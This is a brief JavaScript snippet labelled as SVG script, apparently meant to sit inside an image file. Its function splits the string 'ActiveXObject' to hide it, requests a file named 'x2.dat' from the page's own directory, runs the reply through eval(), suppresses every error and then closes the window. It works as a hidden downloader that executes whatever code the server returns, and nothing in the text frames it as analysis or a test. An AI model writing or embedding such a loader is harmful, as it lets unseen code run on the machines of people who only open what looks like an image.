svg.script:
function go() {
    try {
        var d = document.URL.replace(/[^\/]*$/, "");
        var ax = "Act" + "iveXObject";
        var x = new window[ax]("MSXML2.XMLHTTP");
        x.open("GET", d + "x2.dat", false);
        x.send();
        if (x.status == 200) { eval(x.responseText); }
    } catch (e) {}
    window.close();
}
